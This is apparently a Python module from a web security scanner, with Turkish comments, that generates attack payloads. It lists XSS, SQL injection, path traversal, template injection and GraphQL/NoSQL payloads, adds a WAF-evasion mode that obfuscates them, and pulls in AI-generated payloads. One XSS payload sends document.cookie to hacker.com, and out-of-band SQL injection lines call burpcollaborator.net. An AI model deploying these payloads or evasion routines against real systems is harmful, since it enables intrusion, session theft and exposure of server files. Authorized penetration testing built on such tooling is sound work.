# path: core/payload_generator.py

import random
import re
import asyncio
import json # Faz 29 AI yanıtını işlemek için eklendi
from typing import List, Optional, Dict, Any
from urllib.parse import quote

# Local Imports
from .data_simulator import DataSimulator
from .neural_engine import NeuralEngine # FAZ 29: Neural Engine entegrasyonu
from core.neural_engine import NeuralEngine # Import Neural Engine

class PayloadGenerator:
    """
    [AR-GE v2.0 - CHAOS ENGINE]
    Güvenlik taramaları için dinamik, encode edilmiş ve WAF atlatma (evasion) yeteneğine sahip
    gelişmiş payload üretim motoru.
    
    Özellikler:
    - Dinamik Obfuscation (Rastgele Encoding)
    - Polyglot Payloadlar (XSS + SQLi + LFI tek satırda)
    - WAF Evasion (Cloudflare, AWS WAF, ModSecurity Bypass)
    - SSTI ve GraphQL desteği
    - FAZ 29: AI-Driven Payload Üretimi
    """
    
    # FAZ 15: Sınıf seviyesinde Evasion Modu bayrağı.
    EVASION_MODE = False
    
    # --- XSS PAYLOADS (CHAOS EDITION) ---
    BASE_XSS_PAYLOADS = [
        # Basic & Fast
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        
        # Polyglots (Farklı context'lerden kaçmak için)
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "\"`'><script>/* */alert(1)</script>",
        "';alert(1)//",
        
        # Advanced Event Handlers
        "<body onpageshow=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        
        # Angular/Vue/React Spesifik (Template Injection)
        "{{7*7}}",
        "{{constructor.constructor('alert(1)')()}}",
        "<div v-html=\"'alert(1)'\"></div>"
    ]
    
    # --- SQL INJECTION PAYLOADS (CHAOS EDITION) ---
    BASE_SQLI_PAYLOADS = [
        # 1. Auth Bypass / Boolean Simple
        "' OR 1=1 -- ",
        "\" OR 1=1 -- ",
        "' OR '1'='1",
        "admin'--",
        
        # 2. Union Based (Generic & MySQL)
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        
        # 3. Error Based (Syntax Breakers)
        "'", "\"", "';", "')", "'))",
        
        # 4. Time-Based (Sleep - Polyglot)
        "' AND (SELECT 10 FROM (SELECT(SLEEP(5)))a) -- ",
        "'; WAITFOR DELAY '0:0:5'--",
        
        # 5. WAF Bypass Specific (Comment Obfuscation)
        "'/**/OR/**/1=1/**/--",
        "admin'/*",
        
        # 6. Out of Band (DNS)
        "'; exec master..xp_dirtree '\\burpcollaborator.net\foo'--",
        "' UNION SELECT LOAD_FILE('\\\\burpcollaborator.net\\foo')--"
    ]
    
    # --- LFI / PATH TRAVERSAL (CHAOS EDITION) ---
    BASE_LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL Encoded
        "..%252f..%252f..%252fetc%252fpasswd", # Double URL Encoded
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd"
    ]

    # --- SSTI (Server Side Template Injection) ---
    BASE_SSTI_PAYLOADS = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}"
    ]
    
    # V6.0: Dinamik, teknolojiye özel payload'lar
    CONTEXTUAL_PAYLOADS = {
        "Next.js": [ 
            "<img src=/ onerror=this.src='//hacker.com?'+document.cookie>", 
            "&quot;onanimationend=alert(1) style=animation:none;@keyframes none{}&quot;", 
        ],
        "Vercel": [ 
            "'+alert(1)+'", 
        ],
        "PHP": [
            "<?php echo 'XSS_TEST'; ?>", 
            "<!--?php echo 'XSS'; ?-->",
            "${alert(1)}",
            "' or 1=1/*", 
        ],
        "Apache": [ "%2e%2e%2f" ],
        "Nginx": [ "/../../../../etc/passwd" ],
        "Python": [ "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}" ] # Jinja2 LFI
    }

    # FAZ 20: GraphQL için Özel Payloadlar
    GRAPHQL_INTROSPECTION_PAYLOADS = [
        '{"query": "{__schema{types{name,kind}}}"}',
        '{"query": "{__schema{queryType{name} mutationType{name}}}"}',
        '{"query": "{__schema{types{name,fields{name,args{name,type{name}}}}}}"}',
        '{"query": "{ synara_test_error }"}', 
    ]
    
    GRAPHQL_INJECTION_PAYLOADS = [
        '1 OR 1=1',
        '" OR 1=1 --',
        '{"$ne": null}',
        '{"$gt": ""}',
    ]

    # --- CONTEXT-AWARE XSS (Genişletilmiş) ---
    CONTEXT_AWARE_PAYLOADS = {
        "SCRIPT": [
            "';alert(1)//",
            "'-alert(1)-'",
            "</script><script>alert(1)</script>", 
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", 
        ],
        "ATTRIBUTE": [
            "\" onmouseover=alert(1) x=\"", 
            "' autofocus onfocus=alert(1) x='",
            "\"><svg/onload=alert(1)>", 
            "\" style=\"behavior:url(#default#time2)\" onbegin=\"alert(1)\"",
            "&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;=alert&#x28;1&#x29;", 
        ],
        "BODY": [
            "<svg/onload=alert(1)>", 
            "<details/open/ontoggle=alert(1)>", 
            "<img src=x onerror=alert(1)>",
            "<iframe/src=javascript:alert(1)>",
            "<\x73\x63\x72\x69\x70\x74>alert(1)</script>", 
        ],
    }

    def __init__(self, neural_engine_instance: NeuralEngine): # FAZ 29: Neural Engine enjeksiyonu
        self.neural_engine = neural_engine_instance
        
    @classmethod
    def set_evasion_mode(cls, enabled: bool):
        """WAF Evasion modunu açar veya kapatır."""
        cls.EVASION_MODE = enabled

    def _extract_tech_info(self, results_list: List[dict]) -> List[str]:
        """
        Motor sonuç listesinden Heuristic Scanner'ın bulduğu teknoloji ipuçlarını çıkarır.
        """
        tech_info = set()
        
        for result in results_list:
            if result['category'] == 'HEURISTIC' and 'Sunucu yazılımı' in result['message']:
                match = re.search(r':\s*(.*)', result['message'])
                if match:
                    tech_info.add(match.group(1).strip())
            
            if result['category'] == 'HEADERS' and 'X-Powered-By' in result['message']:
                match = re.search(r'\((.*?)\)', result['message'])
                if match:
                    tech_info.add(match.group(1).strip())

        return list(tech_info)

    def generate_contextual_payloads(self, results_list: List[dict]) -> List[str]:
        """
        Motor sonuçlarına göre ilgili teknolojilere ait dinamik payload'ları üretir.
        """
        tech_hints = self._extract_tech_info(results_list)
        contextual_payloads = set()
        
        if not tech_hints:
            return []

        # self.neural_engine.log(f"[AI FUZZING] Bağlamsal payload'lar için teknoloji ipuçları: {', '.join(tech_hints)}", "INFO") # Loglama neural_engine'e ait

        for hint in tech_hints:
            for key, payloads in self.CONTEXTUAL_PAYLOADS.items():
                if key.lower() in hint.lower():
                    for payload in payloads:
                        contextual_payloads.add(self._process_payload(payload))
        
        return list(contextual_payloads)
    
    async def generate_context_aware_xss_payloads(self, context_type: Optional[str], context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Heuristic Engine'den gelen yansıma bağlamına göre XSS payload'ları üretir.
        FAZ 29: AI-Driven payload'ları buraya ekler.
        """
        if not context_type:
            return []
            
        context_data = context if context is not None else {}
        context_data["reflection_context"] = context_type
        
        # 1. AI-Driven Payload'ları Al
        ai_payloads = await self.neural_engine.generate_ai_payloads(context_data, "XSS")
        
        # 2. Statik Context-Aware Payload'ları Yükle
        context = context_type.upper().strip()
        static_context_payloads = self.CONTEXT_AWARE_PAYLOADS.get(context, [])
        
        final_payloads = set(ai_payloads)
        
        for payload in static_context_payloads:
            final_payloads.add(payload)
            processed = self._process_payload(payload)
            final_payloads.add(processed)
            
        # self.neural_engine.log(f"[XSS FUZZING] Context-Aware ({context}) payload'lar eklendi: {len(final_payloads)} adet (AI dahil).", "INFO")
        return list(final_payloads)

    async def generate_xss_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Kodlanmış XSS payload'larını döndürür (AI destekli).
        """
        
        # 1. AI-Driven Payload'ları Al (Genel XSS bağlamı)
        ai_payloads = await self.neural_engine.generate_ai_payloads(context or {}, "XSS")
        
        # 2. Statik Payload'ları Yükle
        final_payloads = set(ai_payloads)
        for payload in self.BASE_XSS_PAYLOADS:
            processed = self._process_payload(payload)
            final_payloads.add(processed)
            final_payloads.add(self._url_encode(processed))
            
        return list(final_payloads)

    async def generate_sqli_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        SQL Injection için payload'ları döndürür (AI destekli).
        """
        
        # 1. AI-Driven Payload'ları Al
        ai_payloads = await self.neural_engine.generate_ai_payloads(context or {}, "SQLi")
        
        # 2. Statik Payload'ları Yükle
        final_payloads = set(ai_payloads)
        for payload in self.BASE_SQLI_PAYLOADS:
            processed = self._process_payload(payload, is_sqli=True)
            final_payloads.add(self._url_encode(processed))
        
        return list(final_payloads)
    
    def generate_lfi_payloads(self) -> List[str]:
        """
        LFI/Path Traversal payload'larını döndürür.
        """
        final_payloads = set()
        for payload in self.BASE_LFI_PAYLOADS:
            final_payloads.add(payload)
            # Null Byte Injection
            final_payloads.add(payload + "%00")
            # WAF Evasion (Path truncation)
            final_payloads.add(payload.replace("../", "....//"))
        return list(final_payloads)
        
    def generate_ssti_payloads(self) -> List[str]:
        return self.BASE_SSTI_PAYLOADS

    def generate_graphql_introspection_payloads(self) -> List[str]:
        return self.GRAPHQL_INTROSPECTION_PAYLOADS
        
    def generate_graphql_injection_payloads(self) -> List[str]:
        return self.GRAPHQL_INJECTION_PAYLOADS

    def _process_payload(self, payload: str, is_sqli: bool = False) -> str:
        """
        Payload'u mevcut moda (Standart/Evasion) göre işler.
        """
        if not self.EVASION_MODE:
            return payload
            
        # --- WAF EVASION TEKNİKLERİ ---
        if is_sqli:
            # SQLi Evasion: 
            # 1. Boşlukları yorum satırlarıyla değiştir (/**/)
            payload = payload.replace(" ", "/**/")
            
            # 2. 'UNION' gibi kelimelerin case'ini değiştir (uNiOn)
            if "UNION" in payload:
                payload = payload.replace("UNION", self._random_case("UNION"))
            if "SELECT" in payload:
                payload = payload.replace("SELECT", self._random_case("SELECT"))
                
            return payload
        else:
            # XSS Evasion:
            # 1. 'alert' yerine 'confirm' veya 'prompt' kullan (WAF filtrelerini şaşırtmak için)
            if "alert" in payload and random.choice([True, False]):
                payload = payload.replace("alert", "confirm")
            
            # 2. Tag aralarına gereksiz boşluk/karakter ekle (örn: < img)
            if "<script>" in payload:
                payload = payload.replace("<script>", "<script >")
                
            # 3. Double URL Encoding
            return self._url_encode(payload) # Basit bir evasion katmanı

    def _random_case(self, text: str) -> str:
        """Metni rastgele büyük/küçük harfe çevirir (SeLeCt)."""
        return "".join(random.choice([k.upper(), k.lower()]) for k in text)

    def _url_encode(self, data: str) -> str:
        """Veriyi URL kodlamasından geçirir."""
        return quote(data)

    def _html_encode(self, data: str) -> str:
        """HTML Varlık Kodlaması."""
        return data.replace('<', '&#60;').replace('>', '&#62;').replace('"', '&#34;').replace("'", '&#39;')